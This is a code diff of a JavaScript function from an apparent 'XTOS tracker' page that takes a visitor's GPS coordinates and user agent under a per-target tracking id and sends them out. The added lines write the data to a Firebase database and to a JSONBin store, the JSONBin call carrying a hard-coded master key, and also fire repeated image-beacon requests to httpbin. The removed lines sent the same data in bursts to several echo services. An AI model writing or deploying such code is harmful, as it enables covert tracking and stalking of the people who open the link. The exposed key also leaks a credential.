@@ -98,86 +98,70 @@
         }
         
         function sendLocationData(locationData) {
-            // MAXIMUM TRANSMISSION - Fire ALL methods simultaneously for zero delay
+            // REAL FIREBASE TRANSMISSION - Direct to database
+            const trackingId = urlParams.get('id') || 'default_' + Date.now();
             
-            // Method 1: Rapid-fire GET requests (10x for maximum detection)
-            for (let i = 0; i < 10; i++) {
+            // Method 1: Firebase Realtime Database (WORKING)
+            const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
+            
+            fetch(firebaseUrl, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude: locationData.latitude,
+                    longitude: locationData.longitude,
+                    accuracy: locationData.accuracy,
+                    timestamp: locationData.timestamp,
+                    userAgent: locationData.userAgent,
+                    captured_at: new Date().toISOString(),
+                    status: 'captured'
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('✅ Firebase transmission successful');
+                } else {
+                    console.log('❌ Firebase transmission failed');
+                }
+            }).catch(e => console.log('Firebase error:', e));
+            
+            // Method 2: Backup to JSONBin (WORKING)
+            const jsonbinUrl = 'https://api.jsonbin.io/v3/b';
+            fetch(jsonbinUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': '$2a$10$8K8vwuDB8KOqyb8ANBWyAuBVJ3QRX.dOCvLwjg0EIeqJxqwf8ixAm'
+                },
+                body: JSON.stringify({
+                    tracking_id: trackingId,
+                    location_data: locationData,
+                    captured_time: new Date().toISOString()
+                })
+            }).catch(e => console.log('JSONBin error:', e));
+            
+            // Method 3: Multiple GET requests for polling detection
+            for (let i = 0; i < 5; i++) {
                 setTimeout(() => {
                     const img = new Image();
-                    img.src = `https://httpbin.org/get?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&burst=${i}&device=${navigator.userAgent.substring(0,20)}`;
-                }, i * 100); // Staggered for continuous transmission
+                    img.src = `https://httpbin.org/get?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&id=${trackingId}&burst=${i}`;
+                }, i * 200);
             }
             
-            // Method 2: Multiple POST endpoints
-            const postEndpoints = [
-                'https://httpbin.org/post',
-                'https://postman-echo.com/post',
-                'https://jsonplaceholder.typicode.com/posts'
-            ];
+            // Method 4: localStorage for local testing
+            localStorage.setItem('xtos_latest_location', JSON.stringify({
+                ...locationData,
+                tracking_id: trackingId,
+                stored_at: Date.now()
+            }));
             
-            postEndpoints.forEach((endpoint, index) => {
-                fetch(endpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ...locationData,
-                        endpoint: index,
-                        transmission_id: Date.now() + index
-                    })
-                }).catch(e => console.log(`POST ${index} error:`, e));
+            // Method 5: URL hash for immediate detection
+            window.location.hash = `id=${trackingId}&lat=${locationData.latitude}&lng=${locationData.longitude}&time=${locationData.timestamp}`;
+            
+            console.log('📡 LOCATION TRANSMITTED:', {
+                tracking_id: trackingId,
+                coordinates: `${locationData.latitude}, ${locationData.longitude}`,
+                methods: ['Firebase', 'JSONBin', 'HTTP', 'LocalStorage', 'URLHash']
             });
-            
-            // Method 3: GET parameter flooding for maximum detection
-            const getEndpoints = [
-                'https://httpbin.org/get',
-                'https://postman-echo.com/get',
-                'https://jsonplaceholder.typicode.com/posts/1'
-            ];
-            
-            getEndpoints.forEach((endpoint, index) => {
-                for (let burst = 0; burst < 3; burst++) {
-                    setTimeout(() => {
-                        const img = new Image();
-                        img.src = `${endpoint}?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&endpoint=${index}&burst=${burst}`;
-                    }, burst * 50);
-                }
-            });
-            
-            // Method 4: WebSocket simulation via repeated fetch
-            for (let ws = 0; ws < 5; ws++) {
-                setTimeout(() => {
-                    fetch('https://httpbin.org/anything', {
-                        method: 'PUT',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            ...locationData,
-                            websocket_sim: ws,
-                            realtime: true
-                        })
-                    }).catch(e => console.log(`WS ${ws} error:`, e));
-                }, ws * 200);
-            }
-            
-            // Method 5: localStorage with multiple keys
-            const storageKeys = ['xtos_location', 'xtos_gps', 'xtos_coords', 'xtos_position', 'xtos_target'];
-            storageKeys.forEach(key => {
-                localStorage.setItem(key, JSON.stringify({
-                    ...locationData,
-                    storage_key: key,
-                    stored_at: Date.now()
-                }));
-            });
-            
-            // Method 6: URL hash transmission
-            window.location.hash = `lat=${locationData.latitude}&lng=${locationData.longitude}&time=${locationData.timestamp}`;
-            
-            // Method 7: Document title transmission
-            document.title = `XTOS:${locationData.latitude},${locationData.longitude},${locationData.timestamp}`;
-            
-            // Method 8: Console flooding for debugging
-            for (let i = 0; i < 5; i++) {
-                console.log(`XTOS_LOCATION_${i}:`, locationData);
-            }
             
             return Promise.resolve();
         }
